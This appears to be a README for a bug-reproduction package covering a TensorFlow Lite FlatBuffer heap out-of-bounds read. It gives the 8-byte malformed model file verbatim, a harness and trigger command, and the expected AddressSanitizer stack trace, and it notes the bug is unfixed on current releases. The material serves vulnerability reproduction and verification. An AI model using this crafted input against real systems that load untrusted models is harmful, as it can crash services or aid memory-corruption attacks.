# tensorflow ISSUE-115308 flatbuffer OOB — provenance

## crash.tflite
8-byte PoC verbatim from
https://github.com/tensorflow/tensorflow/issues/115308 (issue body,
2026-04-06):

```
\x18\x00\x00\x00TFL3
```

The first 4 bytes = FlatBuffer root-table offset (0x18, attacker
controlled). The trailing 4 bytes = TFLite file_identifier "TFL3".

Regenerate via:
```
$ python3 craft_crash_tflite.py crash.tflite
```

## harness_tflite_load.cpp
Standalone harness that calls
`tflite::FlatBufferModel::BuildFromBuffer` on the bytes read from
argv[1] — same code path the issue's libFuzzer harness exercises.
Linked against `libtensorflow-lite.a` (ASAN+UBSan instrumented) and
`libflatbuffers.a` from the same build dir.

## Trigger
```
$ ASAN_OPTIONS=use_sigaltstack=0 \
  ${REPO}/build-asan-tflite-harness/bin/harness_tflite_load \
  ${POC_DIR}/crash.tflite
```

Expected ASAN signature (verbatim from local repro):
```
AddressSanitizer: heap-buffer-overflow on address ... READ of size 4
  #0 flatbuffers::ReadScalar<int>(...)        base.h:428
  #1 flatbuffers::Table::GetVTable()          table.h:30
  #2 flatbuffers::Table::GetOptionalFieldOffset()  table.h:37
  #3 flatbuffers::Table::GetPointer<...>()    table.h:52
  #4 tflite::Model::buffers()                 schema_generated.h:16609
  #5 FlatBufferModelBase::ValidateModelBuffers()  model_builder_base.h:522
  #6 FlatBufferModelBase::BuildFromAllocation()   model_builder_base.h:356
  #7 FlatBufferModelBase::BuildFromBuffer()       model_builder_base.h:183
  #8 main                                        harness_tflite_load.cpp:37
```

## Status
Open in upstream tracker since 2026-04-06; verified unchanged on
v2.18.0 (commit 6550e4bd) and master (462d61f24b4).
